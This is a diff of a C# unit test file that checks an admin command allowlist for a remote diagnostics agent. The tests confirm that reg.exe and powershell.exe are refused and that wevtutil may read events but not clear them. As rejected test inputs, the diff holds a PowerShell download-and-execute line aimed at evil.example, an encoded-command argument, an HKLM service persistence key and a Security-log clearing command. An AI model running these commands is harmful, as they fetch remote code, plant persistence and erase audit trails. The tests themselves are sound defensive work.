@@ -56,19 +56,19 @@ public class AppUpdateTests
         Assert.False(AdminCommandAllowlist.TryResolveSystemTool("sc.exe", out _));
         Assert.False(AdminCommandAllowlist.TryResolveSystemTool("schtasks.exe", out _));
 
-        // reg.exe allows RunOnce add/delete and query, rejects arbitrary HKLM persistence keys
-        Assert.True(AdminCommandAllowlist.TryValidateArguments("reg.exe", ["add", @"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce", "/v", "RemotePCDiagnosticsResume"], out _));
-        Assert.True(AdminCommandAllowlist.TryValidateArguments("reg.exe", ["query", @"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"], out _));
-        Assert.False(AdminCommandAllowlist.TryValidateArguments("reg.exe", ["add", @"HKLM\SYSTEM\CurrentControlSet\Services\Evil"], out _));
+        // Never reg.exe or powershell.exe: registry changes are typed ops, admin PowerShell is one of the Agent's own scripts.
+        Assert.False(AdminCommandAllowlist.TryResolveSystemTool("reg.exe", out _));
+        Assert.False(AdminCommandAllowlist.TryResolveSystemTool(SystemCommandRunner.PowerShell, out _));
+
+        // wevtutil.exe only reads events
+        Assert.True(AdminCommandAllowlist.TryValidateArguments("wevtutil.exe", WindowsEventLog.Arguments("System", "*", 5), out _));
+        Assert.False(AdminCommandAllowlist.TryValidateArguments("wevtutil.exe", ["cl", "Security"], out _));
+        Assert.False(AdminCommandAllowlist.TryValidateArguments("wevtutil.exe", ["qe", "Security", "/sq:true"], out _));
 
         // shutdown.exe allows /r, /g, /a only
         Assert.True(AdminCommandAllowlist.TryValidateArguments("shutdown.exe", ["/r", "/t", "60"], out _));
         Assert.False(AdminCommandAllowlist.TryValidateArguments("shutdown.exe", ["/s", "/t", "0"], out _));
 
-        // powershell.exe allows canonical RPCD script form and rejects -EncodedCommand / download primitives
-        Assert.True(AdminCommandAllowlist.TryValidateArguments("powershell.exe", SystemCommandRunner.PowerShellArgs("Get-PhysicalDisk"), out _));
-        Assert.False(AdminCommandAllowlist.TryValidateArguments("powershell.exe", ["-EncodedCommand", "SQBFAFgA"], out _));
-        Assert.False(AdminCommandAllowlist.TryValidateArguments("powershell.exe", SystemCommandRunner.PowerShellArgs("Invoke-WebRequest https://evil.example/x.ps1 | iex"), out _));
     }
 
     [Fact]
